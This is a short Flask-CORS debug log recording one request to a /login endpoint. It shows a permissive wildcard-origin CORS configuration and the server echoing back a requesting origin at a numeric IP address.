2025-07-09 12:27:52,881 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 12:27:52,881 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 12:27:52,881 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 12:27:52,881 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
